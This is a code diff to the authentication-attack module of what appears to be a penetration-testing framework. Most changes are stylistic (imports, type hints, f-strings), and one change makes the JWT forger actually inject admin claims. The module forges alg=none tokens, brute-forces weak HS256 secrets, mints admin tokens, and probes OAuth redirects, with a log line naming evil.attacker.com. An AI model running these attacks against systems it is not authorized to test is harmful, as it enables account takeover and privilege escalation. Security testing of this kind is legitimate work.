@@ -8,20 +8,19 @@ import json
 import random
 import re
 import string
-from typing import Any, Dict, List, Optional
 
-from sentinel.models import AttackResult, Credential, EngagementSession
-from sentinel.logger import log
-from sentinel.modules.base import BaseModule
-from sentinel.utils.http import request, jwt_parts, b64url_encode, b64url_decode
 from sentinel.data import COMMON_JWT_SECRETS, JWT_NONE_ALGOS, OAUTH_ENDPOINTS
+from sentinel.logger import log
+from sentinel.models import AttackResult, Credential, EngagementSession
+from sentinel.modules.base import BaseModule
+from sentinel.utils.http import b64url_decode, b64url_encode, jwt_parts, request
 
 
 def _random_str(n: int) -> str:
     return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
 
-def _forge_jwt_none(original: str) -> List[str]:
+def _forge_jwt_none(original: str) -> list[str]:
     """Forge JWT tokens with alg=none variants to bypass signature verification."""
     parsed = jwt_parts(original)
     if not parsed:
@@ -36,13 +35,15 @@ def _forge_jwt_none(original: str) -> List[str]:
     return forged_tokens
 
 
-def _forge_jwt_hs256(original: str, secret: str) -> str:
-    """Forge a JWT token re-signed with HS256 using the given secret."""
+def _forge_jwt_hs256(original: str, secret: str, payload_override: dict | None = None) -> str:
+    """Forge a JWT re-signed with HS256, optionally overriding the payload claims."""
     try:
         parts = jwt_parts(original)
         if not parts:
             return original
         header, payload, _ = parts
+        if payload_override is not None:
+            payload = payload_override
         header["alg"] = "HS256"
         h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
         p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
@@ -57,12 +58,12 @@ class AuthModule(BaseModule):
 
     name = "auth"
 
-    def run(self, es: EngagementSession, **kwargs: object) -> List[AttackResult]:
+    def run(self, es: EngagementSession, **kwargs: object) -> list[AttackResult]:
         jwt_token: str = kwargs.get("jwt_token", "")  # type: ignore[assignment]
         oauth_client_id: str = kwargs.get("oauth_client_id", "")  # type: ignore[assignment]
         oauth_redirect: str = kwargs.get("oauth_redirect", "")  # type: ignore[assignment]
 
-        results: List[AttackResult] = []
+        results: list[AttackResult] = []
         if jwt_token:
             results.extend(self._jwt_attacks(es, jwt_token))
         results.extend(self._session_attacks(es))
@@ -70,8 +71,8 @@ class AuthModule(BaseModule):
         results.extend(self._apikey_spray(es))
         return results
 
-    def _jwt_attacks(self, es: EngagementSession, token: str) -> List[AttackResult]:
-        results: List[AttackResult] = []
+    def _jwt_attacks(self, es: EngagementSession, token: str) -> list[AttackResult]:
+        results: list[AttackResult] = []
         parsed = jwt_parts(token)
         if not parsed:
             return [AttackResult("auth", "jwt_parse", "ERROR", notes="Invalid JWT format")]
@@ -86,7 +87,7 @@ class AuthModule(BaseModule):
             resp = request(es, "GET", test_url,
                            headers={**dict(es.headers), "Authorization": f"Bearer {none_tok}"})
             if resp and resp.status_code == 200:
-                log(f"[Auth/JWT] NONE ALGORITHM ACCEPTED! alg=none bypass works!", "CRIT")
+                log("[Auth/JWT] NONE ALGORITHM ACCEPTED! alg=none bypass works!", "CRIT")
                 results.append(AttackResult(
                     "auth", "jwt_alg_none", "VULN",
                     url=test_url, payload=none_tok[:80],
@@ -97,7 +98,7 @@ class AuthModule(BaseModule):
 
         # 2. Weak secret brute force (HS256)
         if header.get("alg") in ("HS256", "HS384", "HS512"):
-            log(f"[Auth/JWT] Brute-forcing HS256 secret...", "INFO")
+            log("[Auth/JWT] Brute-forcing HS256 secret...", "INFO")
             found_secret = None
             for secret in COMMON_JWT_SECRETS:
                 try:
@@ -119,7 +120,7 @@ class AuthModule(BaseModule):
                 # Forge admin token
                 admin_payload = {**payload, "role": "admin", "is_admin": True,
                                  "user_type": "administrator", "sub": "1"}
-                forged = _forge_jwt_hs256(token, found_secret)
+                forged = _forge_jwt_hs256(token, found_secret, admin_payload)
                 results.append(AttackResult(
                     "auth", "jwt_weak_secret", "VULN",
                     payload=found_secret, evidence=f"Admin token: {forged[:80]}...",
@@ -155,8 +156,8 @@ class AuthModule(BaseModule):
 
         return results
 
-    def _session_attacks(self, es: EngagementSession) -> List[AttackResult]:
-        results: List[AttackResult] = []
+    def _session_attacks(self, es: EngagementSession) -> list[AttackResult]:
+        results: list[AttackResult] = []
 
         # 1. Session fixation
         pre_resp = request(es, "GET", es.base_url)
@@ -194,8 +195,8 @@ class AuthModule(BaseModule):
         return results
 
     def _oauth_attacks(self, es: EngagementSession,
-                       client_id: str, redirect_uri: str) -> List[AttackResult]:
-        results: List[AttackResult] = []
+                       client_id: str, redirect_uri: str) -> list[AttackResult]:
+        results: list[AttackResult] = []
         if not client_id:
             return results
 
@@ -226,7 +227,7 @@ class AuthModule(BaseModule):
                             severity="CRITICAL",
                             notes="OAuth redirect_uri not properly validated — token theft possible",
                         ))
-                        log(f"[Auth/OAuth] Open redirect! Code will be sent to evil.attacker.com", "CRIT")
+                        log("[Auth/OAuth] Open redirect! Code will be sent to evil.attacker.com", "CRIT")
 
         # 2. State parameter missing (CSRF on OAuth)
         for endpoint in OAUTH_ENDPOINTS:
@@ -245,8 +246,8 @@ class AuthModule(BaseModule):
                     break
         return results
 
-    def _apikey_spray(self, es: EngagementSession) -> List[AttackResult]:
-        results: List[AttackResult] = []
+    def _apikey_spray(self, es: EngagementSession) -> list[AttackResult]:
+        results: list[AttackResult] = []
         # Test if API key leakage in JS files
         js_resp = request(es, "GET", es.base_url)
         if not js_resp:
